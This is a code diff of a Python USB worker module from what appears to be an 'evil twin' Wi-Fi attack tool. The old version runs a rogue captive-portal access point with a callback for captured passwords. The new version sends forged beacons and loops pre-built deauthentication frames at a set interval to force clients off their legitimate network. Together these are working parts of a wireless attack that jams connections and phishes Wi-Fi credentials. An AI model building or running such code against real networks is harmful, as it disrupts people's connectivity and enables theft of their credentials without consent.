@@ -1,113 +1,131 @@
-"""USB worker thread for the captive-portal AP.
-
-Runs the beacon TX loop and dispatches incoming frames to the AP core,
-DHCP, DNS, and TCP stacks.  Integrates with the existing airscope driver
-(async ``inject_frame`` / ``register_rx_callback``) via ``asyncio``.
+"""USB worker thread: all blocking PyUSB I/O happens here.
+Cross-platform: works on macOS (IOKit), Windows (WinUSB), Linux (libusb).
 """
-from __future__ import annotations
 
-import asyncio
-import logging
 import threading
-from dataclasses import dataclass, field
-from typing import Callable, Optional
+import time
+import queue
+import logging
+from dataclasses import dataclass
+from typing import Optional, Callable
 
-from airscope.evil_twin.ap.ap_core import APStateMachine
-from airscope.evil_twin.ap.frames import craft_beacon
 
 log = logging.getLogger(__name__)
 
-_BEACON_INTERVAL_MS = 100
-_STALE_CLIENT_SEC = 30.0
-
 
 @dataclass
-class ApWorker:
-    """Runs the captive-portal AP over an existing airscope driver."""
-    driver: object
-    iface: object
-    ssid: str
-    bssid: str
-    channel: int
-    hs: object
-    pair: object
-    on_password: Optional[Callable[[str], None]] = None
-    log_fn: Optional[Callable[[str], None]] = None
+class TxFrame:
+    data: bytes
+    priority: int  # 0=highest (mgmt), 1=dhcp/dns, 2=http, 3=beacon, 4=deauth
+    timestamp: float = 0.0
 
-    _ap: Optional[APStateMachine] = field(default=None, repr=False)
-    _beacon_task: Optional[asyncio.Task] = field(default=None, repr=False)
-    _cleanup_task: Optional[asyncio.Task] = field(default=None, repr=False)
-    _running: bool = field(default=False, repr=False)
-    _tx_queue: list = field(default_factory=list, repr=False)
-    _tx_lock: threading.Lock = field(default_factory=threading.Lock, repr=False)
-    _tx_event: threading.Event = field(default_factory=threading.Event, repr=False)
 
-    def __post_init__(self) -> None:
-        self._log = self.log_fn or (lambda m: log.info(m))
-        bssid_bytes = bytes(int(o, 16) for o in self.bssid.split(":"))
+class UsbWorker:
+    """
+    Dedicated daemon thread for all USB I/O.
 
-        self._ap = APStateMachine(
-            ap_mac=bssid_bytes,
-            ssid=self.ssid,
-            channel=self.channel,
-            usb_tx=self._usb_tx,
-        )
+    - RX: continuously reads from the USB RX endpoint, dispatches frames
+    - TX: priority queue for outgoing frames (mgmt > dhcp > http > beacon > deauth)
+    - Beacon: timer-based, sends pre-built beacon every 100ms
+    - Deauth: timer-based, sends pre-built deauth frames at configured rate
+    """
 
-    def _usb_tx(self, frame: bytes, priority: int = 2) -> None:
-        """Thread-safe TX enqueue. Called from AP core / DHCP / DNS."""
-        with self._tx_lock:
-            self._tx_queue.append((priority, frame))
-            self._tx_event.set()
+    def __init__(self, usb_dev, ep_rx: int, ep_tx: int,
+                 ap_state_machine, beacon_frame: bytes,
+                 deauth_frames: list[bytes], deauth_interval: float = 0.1,
+                 beacon_interval: float = 0.1):
+        self._dev = usb_dev
+        self._ep_rx = ep_rx
+        self._ep_tx = ep_tx
+        self._ap = ap_state_machine
+        self._beacon = beacon_frame
+        self._deauth_frames = deauth_frames
+        self._deauth_interval = deauth_interval
+        self._beacon_interval = beacon_interval
 
-    async def _tx_worker(self) -> None:
-        """Drain the TX queue, sending frames sorted by priority."""
-        while self._running:
-            self._tx_event.wait(timeout=0.01)
-            self._tx_event.clear()
-            frames = []
-            with self._tx_lock:
-                if self._tx_queue:
-                    self._tx_queue.sort(key=lambda t: t[0])
-                    frames = self._tx_queue[:]
-                    self._tx_queue.clear()
-            for _priority, frame in frames:
-                try:
-                    await self.driver.inject_frame(frame)
-                except Exception:
-                    log.debug("inject_frame failed", exc_info=True)
-
-    async def start(self) -> None:
-        self._running = True
-        self.iface.register_rx_callback(self._on_rx)
-        self._beacon_task = asyncio.create_task(self._beacon_loop())
-        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
-        asyncio.create_task(self._tx_worker())
-        self._log(f"[ap-worker] {self.ssid} started on ch {self.channel}")
-
-    async def stop(self) -> None:
+        self._tx_queue: queue.PriorityQueue = queue.PriorityQueue()
         self._running = False
-        if self._beacon_task:
-            self._beacon_task.cancel()
-        if self._cleanup_task:
-            self._cleanup_task.cancel()
-        self.iface.unregister_rx_callback(self._on_rx)
-        self._log("[ap-worker] stopped")
+        self._thread: Optional[threading.Thread] = None
+        self._tx_count = 0
+        self._rx_count = 0
+        self._last_tui_update = 0.0
+        self._stats_callback: Optional[Callable] = None
 
-    def _on_rx(self, pkt) -> None:
-        raw = pkt.raw
-        if len(raw) < 12:
-            return
-        self._ap.handle_rx(raw)
+    def start(self):
+        self._running = True
+        self._thread = threading.Thread(target=self._run, daemon=True, name="USB-Worker")
+        self._thread.start()
+        log.info("USB Worker started")
 
-    async def _beacon_loop(self) -> None:
-        bssid_bytes = bytes(int(o, 16) for o in self.bssid.split(":"))
-        seq = 0
+    def stop(self):
+        self._running = False
+        if self._thread:
+            self._thread.join(timeout=3.0)
+        log.info("USB Worker stopped")
+
+    def set_stats_callback(self, callback: Callable):
+        self._stats_callback = callback
+
+    def enqueue_tx(self, frame: bytes, priority: int = 2):
+        self._tx_queue.put(TxFrame(data=frame, priority=priority,
+                                   timestamp=time.monotonic()))
+
+    def _run(self):
+        next_beacon = time.monotonic()
+        next_deauth = time.monotonic()
+        deauth_idx = 0
+
         while self._running:
-            seq = (seq + 1) & 0xFFF
-            beacon = craft_beacon(bssid_bytes, self.ssid, self.channel, seq)
-            await self.driver.inject_frame(beacon)
-            await asyncio.sleep(_BEACON_INTERVAL_MS / 1000.0)
+            now = time.monotonic()
 
-    async def _cleanup_loop(self) -> None:
-        while self._running:
-            await asyncio.sleep(10.0)
+            try:
+                data = self._dev.read(self._ep_rx, 4096, timeout=5)
+                if data:
+                    self._rx_count += 1
+                    self._ap.handle_rx(bytes(data))
+            except Exception:
+                pass
+
+            while not self._tx_queue.empty():
+                try:
+                    tx_frame = self._tx_queue.get_nowait()
+                    self._dev.write(self._ep_tx, tx_frame.data, timeout=50)
+                    self._tx_count += 1
+                except Exception as e:
+                    log.debug(f"TX error: {e}")
+                    break
+
+            if now >= next_beacon:
+                try:
+                    self._dev.write(self._ep_tx, self._beacon, timeout=50)
+                    self._tx_count += 1
+                except Exception:
+                    pass
+                next_beacon = now + self._beacon_interval
+
+            if self._deauth_frames and now >= next_deauth:
+                try:
+                    frame = self._deauth_frames[deauth_idx % len(self._deauth_frames)]
+                    self._dev.write(self._ep_tx, frame, timeout=50)
+                    self._tx_count += 1
+                    deauth_idx += 1
+                except Exception:
+                    pass
+                next_deauth = now + self._deauth_interval
+
+            if self._stats_callback and now - self._last_tui_update > 0.1:
+                self._last_tui_update = now
+                try:
+                    self._stats_callback({
+                        'tx': self._tx_count,
+                        'rx': self._rx_count,
+                        'clients': len(self._ap._clients),
+                    })
+                except Exception:
+                    pass
+
+            time.sleep(0.001)
+
+    @property
+    def stats(self) -> dict:
+        return {'tx': self._tx_count, 'rx': self._rx_count}
